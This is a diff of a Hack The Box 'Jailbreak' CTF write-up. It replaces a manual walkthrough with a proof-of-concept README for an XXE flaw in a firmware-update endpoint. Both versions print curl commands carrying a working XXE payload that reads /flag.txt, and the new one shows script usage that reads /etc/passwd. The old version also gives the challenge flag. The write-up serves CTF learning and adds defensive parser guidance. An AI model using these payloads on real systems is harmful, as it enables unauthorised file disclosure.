@@ -1,146 +1,132 @@
-# Jailbreak
-
-## Overview
-
-This directory contains the local materials and manual walkthrough for the `Jailbreak` challenge on Hack The Box. This README is written as a practical walkthrough so someone can open the folder, inspect the challenge files, understand the intended weakness, and reproduce the solve with commands that are easy to copy and run.
+# Jailbreak (Hack The Box) - Professional PoC Writeup
 
 ## Challenge Profile
 
-- Challenge: `Jailbreak`
-- Category: `Web`
-- Platform: `Hack The Box`
+| Field | Value |
+|---|---|
+| Challenge | Jailbreak |
+| Category | Web |
+| Vulnerability Class | XXE (XML External Entity) |
+| Impact | Local file disclosure |
+| Target file | `/flag.txt` |
 
-## Directory Contents
+## Scope And Ethics
 
-- `jailbreak_poc.sh`
+This material is for authorized CTF infrastructure only. Do not run this PoC
+against systems you do not own or have explicit permission to test.
 
-## First Commands To Run
+## Technical Summary
 
-This folder does not include original challenge files. Follow the walkthrough the same way you would read a public writeup: understand the target behavior first, then reproduce each manual step against a fresh instance until the flag is visible.
+The firmware endpoint `POST /api/update` parses user-controlled XML. External
+entity expansion is enabled, and the parsed `<Version>` value is reflected in
+the JSON response. This enables an XXE payload to read local files.
+
+## Vulnerable Behavior
+
+1. `/rom` exposes an XML firmware update workflow.
+2. `/static/js/update.js` confirms `POST /api/update` with `application/xml`.
+3. Backend response includes `Firmware version <Version> update initiated.`
+4. Injecting `&xxe;` into `<Version>` leaks local file contents.
+
+## Manual Verification Steps
+
+1. Verify firmware update page:
 
 ```bash
-cd "/home/eliah/Desktop/CTF/HackTheBox/Jailbreak"
-ls -lah
-printf 'Follow the manual walkthrough below against the live service.\n'
+curl -s http://<HOST>:<PORT>/rom
 ```
 
-## Writeup Flow
+2. Verify API endpoint from client JavaScript:
 
-This README follows a public-writeup style structure: start from the provided files or exposed service, confirm the key weakness or clue with manual commands, use that confirmed finding to move forward, and stop only when the final flag or recovered result is visible.
+```bash
+curl -s http://<HOST>:<PORT>/static/js/update.js
+```
 
-When you work through it, keep asking four questions:
+3. Confirm normal parser behavior:
 
-1. What is the challenge giving me locally or remotely?
-2. What exact behavior, bug, artifact, or hidden assumption matters?
-3. How do I verify that with a command or inspection step?
-4. How does that verified result lead to the final flag?
+```bash
+curl -s -X POST http://<HOST>:<PORT>/api/update \
+  -H 'Content-Type: application/xml' \
+  --data '<FirmwareUpdateConfig><Firmware><Version>1.33.7</Version></Firmware></FirmwareUpdateConfig>'
+```
 
-## Walkthrough
+Expected signal:
+`Firmware version 1.33.7 update initiated.`
 
-Challenge Name: Jailbreak
-Category: Web
-Platform: Hack The Box
+4. Exploit XXE to read `/flag.txt`:
 
-### Description
-
-We are given a Pip-Boy themed firmware update interface. The scenario hints
-that we need to bypass the device protections and it explicitly says the flag
-is stored in:
-/flag.txt
-
-Spawned target used during solving:
-http://154.57.164.74:30679
-
-### Core lesson
-
-XML parsers can become dangerous when they allow external entity expansion.
-If the server parses attacker-controlled XML with DTDs enabled, we may be
-able to make it read local files from the server.
-
-This is the classic XXE pattern:
-<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
-
-and then reference:
-&xxe;
-
-Step 1: Identify the interesting route.
-Manual command:
-curl -s http://154.57.164.74:30679/rom
-
-Reason:
-The ROM page contains a "Firmware Update" form with a textarea that expects
-XML input.
-
-Step 2: Read the client-side JavaScript.
-Manual command:
-curl -s http://154.57.164.74:30679/static/js/update.js
-
-Reason:
-The JavaScript shows the exact backend endpoint:
-POST /api/update
-with Content-Type: application/xml
-
-Step 3: Confirm normal behavior.
-Manual command:
-curl -s -X POST http://154.57.164.74:30679/api/update \
--H 'Content-Type: application/xml' \
---data '<FirmwareUpdateConfig><Firmware><Version>1.33.7</Version></Firmware></FirmwareUpdateConfig>'
-
-Reason:
-The response reflects the parsed firmware version:
-"Firmware version 1.33.7 update initiated."
-
-That reflection is important because it gives us a clean place to display the
-contents of an external entity.
-
-Step 4: Send an XXE payload.
-Manual command:
-curl -s -X POST http://154.57.164.74:30679/api/update \
--H 'Content-Type: application/xml' \
---data-binary @- <<'EOF'
+```bash
+curl -s -X POST http://<HOST>:<PORT>/api/update \
+  -H 'Content-Type: application/xml' \
+  --data-binary @- <<'EOF'
 <?xml version="1.0"?>
 <!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
 <FirmwareUpdateConfig>
-<Firmware>
-<Version>&xxe;</Version>
-</Firmware>
+  <Firmware>
+    <Version>&xxe;</Version>
+  </Firmware>
 </FirmwareUpdateConfig>
 EOF
+```
 
-Reason:
-The XML parser resolves &xxe; by reading /flag.txt from the server filesystem.
-The application then inserts that value into the JSON success message.
+Expected signal:
+response `message` contains `HTB{...}`.
 
-### Real-world concept
+## Automated PoC
 
-XXE can lead to:
-- local file disclosure
-- SSRF
-- access to cloud metadata endpoints
-- denial of service through entity expansion
+Script:
+`jailbreak_poc.sh`
 
-Safe parsing generally means:
-- disable external entity resolution
-- disable DTD processing when not needed
-- treat uploaded XML as untrusted input
-
-### Flag obtained
-
-HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_c89ad12a436c81cabb1d862cf6c06547}
-
-## Manual Reproduction Flow
-
-Use the walkthrough above as the authoritative solve path. The short command block below is only the setup phase before you execute the numbered manual steps in this README.
+### Usage
 
 ```bash
 cd "/home/eliah/Desktop/CTF/HackTheBox/Jailbreak"
-ls -lah
+chmod +x jailbreak_poc.sh
+./jailbreak_poc.sh <host> <port> [flag_path]
 ```
 
-## Final Flag
+### Common examples
 
-Following the manual path in this README leads to: `HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_c89ad12a436c81cabb1d862cf6c06547}`
+```bash
+./jailbreak_poc.sh 154.57.164.64 31561
+./jailbreak_poc.sh --host 154.57.164.64 --port 31561 --verbose
+./jailbreak_poc.sh --host 154.57.164.64 --port 31561 --json
+./jailbreak_poc.sh --host 154.57.164.64 --port 31561 --flag-path /etc/passwd
+```
 
-## Study Notes
+### Options
 
-This challenge is worth revisiting if you are practicing `Web` problems. Inspect the routes and source manually first, confirm the weakness yourself, and only then compare your reasoning against the archived solve notes.
+- `--host <host>`: target host or IP.
+- `--port <port>`: target TCP port.
+- `--flag-path <path>`: file to read via XXE, default `/flag.txt`.
+- `--timeout <seconds>`: HTTP timeout, default `10`.
+- `--skip-check`: skip baseline verification request.
+- `--json`: machine-readable JSON output.
+- `--verbose`: print debug details.
+- `-h`, `--help`: show usage help.
+
+### Exit codes
+
+- `0`: exploit succeeded and flag extracted.
+- `2`: invalid CLI arguments.
+- `3`: target connectivity failure.
+- `4`: baseline verification request failed.
+- `5`: exploit request succeeded but no `HTB{...}` token found.
+
+## Why The Exploit Works
+
+- Parser accepts untrusted XML content.
+- DTD/entity resolution is enabled.
+- External entity points to `file:///flag.txt`.
+- Parsed value is reflected in a response field.
+
+## Defensive Guidance
+
+- Disable DTD processing for untrusted XML.
+- Disable external entity expansion entirely.
+- Use hardened XML parser settings by default.
+- Avoid reflecting raw parsed values without strict validation.
+
+## Result Note
+
+Flag values are instance-specific. The format remains `HTB{...}`.
